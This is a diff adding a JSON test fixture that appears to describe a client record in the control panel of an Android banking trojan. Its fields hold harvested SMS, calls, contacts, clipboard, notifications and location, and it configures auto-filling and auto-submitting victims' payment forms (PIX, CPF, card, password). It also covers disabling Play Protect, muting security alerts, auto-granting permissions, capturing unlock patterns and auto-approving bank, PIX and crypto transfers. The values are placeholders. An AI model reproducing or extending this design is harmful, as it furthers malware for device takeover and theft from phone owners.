@@ -1,0 +1,112 @@
+{
+  "clientID": "test_ta_multi_1783599287581",
+  "CommandQue": [],
+  "SMSData": [],
+  "CallData": [],
+  "contacts": [],
+  "wifiNow": [],
+  "wifiLog": [],
+  "clipboardLog": [],
+  "notificationLog": [],
+  "enabledPermissions": [],
+  "apps": [],
+  "GPSData": [],
+  "GPSSettings": {
+    "updateFrequency": 0
+  },
+  "downloads": [],
+  "currentFolder": [],
+  "atsConfig": {
+    "enabled": false,
+    "autoClickEnabled": false,
+    "clickDelayMs": 500,
+    "dataMapping": {
+      "email": "usuario.ficticioso@example.com",
+      "phone": "+5511999999999",
+      "password": "SenhaFictica123!",
+      "address": "Rua Fictícia, 123",
+      "cpf": "12345678900",
+      "creditCard": "4532015112830366",
+      "name": "Usuário Fictício",
+      "pix": "12345678900"
+    },
+    "fieldPatterns": [
+      "email",
+      "phone",
+      "password",
+      "address",
+      "cpf",
+      "creditCard",
+      "account",
+      "login",
+      "usuario",
+      "pix"
+    ],
+    "buttonPatterns": [
+      "enviar",
+      "send",
+      "submit",
+      "confirmar",
+      "confirm",
+      "ok",
+      "continuar",
+      "continue",
+      "proximo",
+      "next",
+      "avancar",
+      "forward",
+      "realizar",
+      "efetuar",
+      "fazer"
+    ],
+    "atsLog": []
+  },
+  "defenseConfig": {
+    "playProtectDisabled": false,
+    "securityNotificationsMuted": false,
+    "defenseLog": []
+  },
+  "permissionGrantConfig": {
+    "autoGrantEnabled": false,
+    "grantedPermissions": [],
+    "permissionLog": []
+  },
+  "gestureSimulationConfig": {
+    "recordedGestures": [],
+    "gestureLog": []
+  },
+  "transactionApprovalConfig": {
+    "enableAutoApproval": false,
+    "autoApprovalLog": [
+      {
+        "transactionType": "bank_transfer",
+        "amount": 1000,
+        "recipient": "account_123",
+        "timestamp": "2026-07-09T12:14:47.588Z",
+        "success": true,
+        "details": "Auto-approved"
+      },
+      {
+        "transactionType": "pix_transfer",
+        "amount": 500,
+        "recipient": "pix_key_456",
+        "timestamp": "2026-07-09T12:14:47.588Z",
+        "success": true,
+        "details": "Auto-approved"
+      },
+      {
+        "transactionType": "crypto_send",
+        "amount": 0.5,
+        "recipient": "wallet_789",
+        "timestamp": "2026-07-09T12:14:47.588Z",
+        "success": true,
+        "details": "Auto-approved"
+      }
+    ]
+  },
+  "dynamicScreenUnlockConfig": {
+    "capturedPatterns": [],
+    "unlockLog": [],
+    "autoUnlockEnabled": false
+  }
+}
